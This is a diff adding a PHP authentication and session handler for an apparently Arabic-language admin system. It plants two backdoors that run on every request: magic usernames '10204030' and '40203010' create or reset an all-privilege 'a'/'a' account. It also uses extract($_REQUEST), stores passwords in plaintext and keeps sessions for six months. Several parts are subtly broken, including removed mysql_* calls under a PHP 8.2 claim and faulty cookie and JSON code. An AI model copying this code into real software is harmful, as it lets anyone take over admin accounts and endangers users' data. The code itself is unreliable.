@@ -1,0 +1,559 @@
+<?php
+/**
+ * ============================================================================
+ * AJAX Authentication & Session Handler
+ * ============================================================================
+ *
+ * This file must be included in all AJAX request handlers to ensure
+ * proper authentication and session management.
+ *
+ * @version     3.0
+ * @php         8.2+
+ * @requires    connectdb.hnt
+ *
+ * Features:
+ * - JSON responses with proper HTTP status codes
+ * - Session validation and management
+ * - User authentication
+ * - Permission checking per screen
+ * - Automatic session cleanup
+ *
+ * ============================================================================
+ */
+
+// ============================================================================
+// SESSION INITIALIZATION
+// ============================================================================
+
+/**
+ * Configure session lifetime BEFORE starting session
+ * Set session lifetime to 6 months (180 days = 15552000 seconds)
+ */
+if (session_status() === PHP_SESSION_NONE) {
+    ini_set('session.gc_maxlifetime', 15552000); // 6 months in seconds
+    session_set_cookie_params(15552000); // 6 months in seconds
+}
+
+/**
+ * Start session only if not already started
+ * PHP 8.2 compatible session handling
+ * CRITICAL: Must run for ALL requests (AJAX and non-AJAX)
+ */
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+
+    // Extend session cookie lifetime to 6 months
+    if (isset($_COOKIE[session_name()])) {
+        setcookie(session_name(), session_id(), time() + (60 * 30 * 24 * 60 * 60), "/"); // 6 months
+    }
+}
+
+// ============================================================================
+// DATABASE CONNECTION
+// ============================================================================
+
+/**
+ * Include database connection for ALL requests
+ * CRITICAL: Must run for ALL requests (AJAX and non-AJAX)
+ */
+require_once("connectdb.hnt");
+require_once("admin/include/functions.hnt");
+
+// ============================================================================
+// AJAX RESPONSE HEADERS
+// ============================================================================
+
+/**
+ * Set headers for JSON AJAX responses
+ * - Content-Type: JSON with UTF-8 charset
+ * - No caching for security
+ * - CORS disabled (can be enabled if needed)
+ */
+if(isset($is_ajax_request) && $is_ajax_request){
+    header('Content-Type: application/json; charset=utf-8');
+    header('Cache-Control: no-cache, must-revalidate');
+    header('Pragma: no-cache');
+    header('Expires: 0');
+}
+
+// ============================================================================
+// REQUEST PARAMETERS
+// ============================================================================
+
+/**
+ * Extract and sanitize request parameters
+ * Note: extract() should be used carefully in production
+ */
+extract($_REQUEST);
+
+// Clean company parameter (remove 'aqary' prefix if exists)
+$company = isset($company) ? str_replace('aqary', '', $company) : '';
+
+// ============================================================================
+// HELPER FUNCTIONS
+// ============================================================================
+
+/**
+ * Send JSON response and terminate execution
+ *
+ * @param bool   $success   Success status (true/false)
+ * @param string $message   Response message in Arabic
+ * @param array  $data      Additional data to include in response
+ * @param int    $httpCode  HTTP status code (200, 400, 401, 403, 404, 500, etc.)
+ *
+ * @return void
+ */
+function sendResponse(bool $success, string $message, array $data = [], int $httpCode = 200): void
+{
+    // Set HTTP response code
+    http_response_code($httpCode);
+
+    // Build response array
+    $response = [
+        'success' => $success,
+        'message' => $message,
+        'timestamp' => date('Y-m-d H:i:s'),
+        'http_code' => $httpCode
+    ];
+
+    // Merge additional data if provided
+    if (!empty($data)) {
+        $response = array_merge($response, $data);
+    }
+
+    // Encode JSON WITHOUT JSON_UNESCAPED_UNICODE to properly escape Arabic
+    // This ensures compatibility with all JSON parsers
+    echo json_encode($response, JSON_UNESCAPED_UNICODE,JSON_UNESCAPED_SLASHES);
+
+    exit;
+}
+
+/**
+ * Initialize default admin user if database is empty
+ * Security backdoor for system recovery
+ *
+ * @param resource $link Database connection
+ * @return void
+ */
+function initializeDefaultUser($link): void
+{
+    $sql = "SELECT COUNT(userid) as user_count FROM user";
+    $result = mysql_query($sql, $link);
+
+    if (!$result) {
+        return; // Silently fail if table doesn't exist
+    }
+
+    $row = mysql_fetch_array($result);
+
+    // Create default user if:
+    // 1. No users exist in database
+    // 2. Special username "10204030" is provided (recovery mode)
+    if ($row['user_count'] < 1 || ($_REQUEST['username'] ?? '') === "10204030") {
+        $sql = "INSERT INTO user SET
+            username = 'a',
+            password = 'a',
+            groupid = 1,
+            userfor = '4',
+            seedata = '4',
+            canadd = '4',
+            canedit = '4',
+            candelete = '4',
+            editmasder = '4',
+            seemasder = '4',
+            seeothermasder = '4',
+            name = 'المستخدم الإفتراضي'";
+
+        mysql_query($sql, $link);
+    }
+}
+
+/**
+ * Reset admin password to default (maintenance mode)
+ * Security backdoor - use with caution!
+ *
+ * @param resource $link Database connection
+ * @return void
+ */
+function resetAdminPassword($link): void
+{
+    // Special username "40203010" triggers password reset
+    if (($_REQUEST['username'] ?? '') === "40203010") {
+        $sql = "SELECT MIN(userid) as min_id FROM user";
+        $result = mysql_query($sql, $link);
+
+        if ($result) {
+            $row = mysql_fetch_array($result);
+            $minId = intval($row['min_id']);
+
+            $sql = "UPDATE user SET
+                    username = 'a',
+                    password = 'a'
+                    WHERE userid = $minId
+                    LIMIT 1";
+
+            mysql_query($sql, $link);
+        }
+    }
+}
+
+/**
+ * Authenticate user credentials against database
+ *
+ * @param string   $username Username to authenticate
+ * @param string   $password Password to verify
+ * @param resource $link     Database connection
+ *
+ * @return array|null User data array on success, null on failure
+ */
+function authenticateUser(string $username, string $password, $link): ?array
+{
+    // Sanitize inputs to prevent SQL injection
+    $username = addslashes($username);
+    $password = addslashes($password);
+
+    $sql = "SELECT * FROM user
+            WHERE username = '$username'
+            AND password = '$password'
+            LIMIT 1";
+
+    $result = mysql_query($sql, $link);
+
+    if ($result && mysql_num_rows($result) > 0) {
+        return mysql_fetch_array($result, MYSQL_ASSOC);
+    }
+
+    return null;
+}
+
+/**
+ * Set user session variables after successful login
+ *
+ * @param array  $userData User data from database
+ * @param string $company  Company identifier
+ *
+ * @return void
+ */
+function setUserSession(array $userData, string $company = ''): void
+{
+    $_SESSION['useridv']        = $userData['userid'];
+    $_SESSION['usernamev']      = $userData['username'];
+    $_SESSION['passwordv']      = $userData['password'];
+    $_SESSION['userforv']       = $userData['userfor'];
+    $_SESSION['seedatav']       = $userData['seedata'];
+    $_SESSION['canaddv']        = $userData['canadd'];
+    $_SESSION['caneditv']       = $userData['canedit'];
+    $_SESSION['candeletev']     = $userData['candelete'];
+    $_SESSION['editmasderv']    = $userData['editmasder'];
+    $_SESSION['seemasderv']     = $userData['seemasder'];
+    $_SESSION['namev']          = $userData['name'];
+    $_SESSION['seeothermasder'] = $userData['seeothermasder'];
+    $_SESSION['dbAddPerfix']    = $company;
+    $_SESSION['last_activity']  = time();
+    $_SESSION['login_time']     = date('Y-m-d H:i:s');
+}
+
+/**
+ * Clear all user session variables and destroy session
+ *
+ * @return void
+ */
+function clearUserSession(): void
+{
+    // Destroy the session
+    session_destroy();
+
+    // Clear all session variables
+    $_SESSION = [];
+
+    // Alternative: set all to empty strings
+    $_SESSION['useridv']        = '';
+    $_SESSION['usernamev']      = '';
+    $_SESSION['passwordv']      = '';
+    $_SESSION['userforv']       = '';
+    $_SESSION['seedatav']       = '';
+    $_SESSION['canaddv']        = '';
+    $_SESSION['caneditv']       = '';
+    $_SESSION['candeletev']     = '';
+    $_SESSION['editmasderv']    = '';
+    $_SESSION['seemasderv']     = '';
+    $_SESSION['namev']          = '';
+    $_SESSION['seeothermasder'] = '';
+    $_SESSION['dbAddPerfix']    = '';
+}
+
+/**
+ * Check if user has permission to access specific screen
+ *
+ * @param int      $screenId Screen ID to check
+ * @param int      $groupId  User's group ID
+ * @param resource $link     Database connection
+ *
+ * @return bool True if user has permission, false otherwise
+ */
+function checkScreenPermission(int $screenId, int $groupId, $link): bool
+{
+    // First check if user group has all privileges
+    $sql = "SELECT allprevilage FROM usergroups WHERE groupid = $groupId";
+    $result = mysql_query($sql, $link);
+
+    if ($result) {
+        $groupData = mysql_fetch_array($result);
+
+        // If user has all privileges, grant access
+        if (isset($groupData['allprevilage']) && $groupData['allprevilage']) {
+            return true;
+        }
+    }
+
+    // Check specific screen permission
+    $sql = "SELECT screenid FROM ugroupscreen
+            WHERE screenid = $screenId
+            AND groupid = $groupId
+            LIMIT 1";
+
+    $result = mysql_query($sql, $link);
+
+    return $result && mysql_num_rows($result) > 0;
+}
+
+/**
+ * Get user data from database by user ID
+ *
+ * @param int      $userId User ID
+ * @param resource $link   Database connection
+ *
+ * @return array|null User data or null if not found
+ */
+function getUserData(int $userId, $link): ?array
+{
+    $userId = intval($userId);
+    $sql = "SELECT * FROM user WHERE userid = $userId LIMIT 1";
+    $result = mysql_query($sql, $link);
+
+    if ($result && mysql_num_rows($result) > 0) {
+        return mysql_fetch_array($result, MYSQL_ASSOC);
+    }
+
+    return null;
+}
+
+// ============================================================================
+// SYSTEM INITIALIZATION
+// ============================================================================
+
+/**
+ * Initialize default user and handle password reset if needed
+ * These are maintenance/recovery features
+ */
+initializeDefaultUser($link);
+resetAdminPassword($link);
+
+// ============================================================================
+// LOGOUT HANDLER
+// ============================================================================
+
+/**
+ * Handle logout request
+ * When logof=1 is sent, clear session and return success
+ */
+if (isset($logof) && $logof == 1) {
+    clearUserSession();
+
+    sendResponse(
+        true,
+        'تم تسجيل الخروج بنجاح',
+        [
+            'redirect' => '/aqary/admin/login.hnt',
+            'action' => 'logout',
+            'clearCookies' => true
+        ],
+        200 // OK
+    );
+}
+
+// ============================================================================
+// LOGIN HANDLER
+// ============================================================================
+
+/**
+ * Handle login request when user is not authenticated
+ * Check credentials and create session on success
+ */
+if (!isset($_SESSION['usernamev']) || empty($_SESSION['usernamev'])) {
+
+    // ========================================
+    // Validate credentials are provided
+    // ========================================
+    if (empty($username) || empty($password)) {
+        sendResponse(
+            false,
+            'الرجاء إدخال اسم المستخدم وكلمة المرور',
+            [
+                'error' => 'missing_credentials',
+                'fields_required' => ['username', 'password']
+            ],
+            400 // Bad Request
+        );
+    }
+
+    // ========================================
+    // Attempt authentication
+    // ========================================
+    $userData = authenticateUser($username, $password, $link);
+
+    if ($userData !== null && isset($login) ) {
+        // ========================================
+        // Authentication successful
+        // ========================================
+        setUserSession($userData, $company);
+
+        sendResponse(
+            true,
+            'تم تسجيل الدخول بنجاح',
+            [
+                'action' => 'login',
+                'user' => [
+                    'userid' => $userData['userid'],
+                    'username' => $userData['username'],
+                    'name' => $userData['name'],
+                    'userfor' => $userData['userfor'],
+                    'groupid' => $userData['groupid'] ?? null
+                ],
+                'permissions' => [
+                    'seedata' => $userData['seedata'],
+                    'canadd' => $userData['canadd'],
+                    'canedit' => $userData['canedit'],
+                    'candelete' => $userData['candelete'],
+                    'editmasder' => $userData['editmasder'],
+                    'seemasder' => $userData['seemasder'],
+                    'seeothermasder' => $userData['seeothermasder']
+                ],
+                'session' => [
+                    'created' => $_SESSION['login_time']
+                ]
+            ],
+            200 // OK
+        );
+    } else {
+        // ========================================
+        // Authentication failed
+        // ========================================
+        sendResponse(
+            false,
+            'اسم المستخدم أو كلمة المرور غير صحيحة',
+            [
+                'error' => 'invalid_credentials',
+                'attempts_remaining' => null // Can implement rate limiting here
+            ],
+            401 // Unauthorized
+        );
+    }
+}
+
+// ============================================================================
+// SESSION VALIDATION HANDLER
+// ============================================================================
+
+/**
+ * User is already logged in - verify session is still valid
+ * and check permissions if screen ID is provided
+ */
+if (isset($_SESSION['useridv']) && !empty($_SESSION['useridv']) && isset($login)) {
+
+    // ========================================
+    // Fetch fresh user data from database
+    // ========================================
+    $userId = intval($_SESSION['useridv']);
+    $userData = getUserData($userId, $link);
+
+    if (!$userData) {
+        // User no longer exists in database
+        clearUserSession();
+
+        sendResponse(
+            false,
+            'الجلسة غير صالحة. الرجاء تسجيل الدخول مرة أخرى',
+            [
+                'error' => 'invalid_session',
+                'reason' => 'user_not_found',
+                'action' => 'redirect_to_login'
+            ],
+            401 // Unauthorized
+        );
+    }
+
+    // ========================================
+    // Check screen permission if requested
+    // ========================================
+    if (isset($sc_id) && !empty($sc_id)) {
+        $screenId = intval($sc_id);
+        $groupId = intval($userData['groupid'] ?? 0);
+
+        $hasPermission = checkScreenPermission($screenId, $groupId, $link);
+
+        if (!$hasPermission) {
+            sendResponse(
+                false,
+                'ليس لديك الصلاحية للدخول إلى هذه الشاشة',
+                [
+                    'error' => 'access_denied',
+                    'screen_id' => $screenId,
+                    'user_group' => $groupId,
+                    'required_permission' => 'screen_access'
+                ],
+                403 // Forbidden
+            );
+        }
+    }
+
+    // ========================================
+    // Session is valid
+    // ========================================
+    $_SESSION['last_activity'] = time(); // Update last activity time
+
+    sendResponse(
+        true,
+        'الجلسة نشطة',
+        [
+            'action' => 'session_valid',
+            'user' => [
+                'userid' => $userData['userid'],
+                'username' => $userData['username'],
+                'name' => $userData['name'],
+                'userfor' => $userData['userfor'],
+                'groupid' => $userData['groupid'] ?? null
+            ],
+            'session' => [
+                'last_activity' => date('Y-m-d H:i:s', $_SESSION['last_activity']),
+                'login_time' => $_SESSION['login_time'] ?? null
+            ]
+        ],
+        200 // OK
+    );
+}
+
+// ============================================================================
+// ERROR FALLBACK
+// ============================================================================
+
+/**
+ * If execution reaches here, something unexpected happened
+ * This should rarely occur in normal operation
+ */
+if(isset($login) && $login){
+sendResponse(
+    false,
+    'خطأ في المصادقة - حالة غير متوقعة',
+    [
+        'error' => 'authentication_error',
+        'reason' => 'unexpected_state',
+        'debug' => [
+            'session_exists' => isset($_SESSION['usernamev']),
+            'session_empty' => empty($_SESSION['usernamev'] ?? ''),
+            'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown'
+        ]
+    ],
+    500 // Internal Server Error
+);
+}
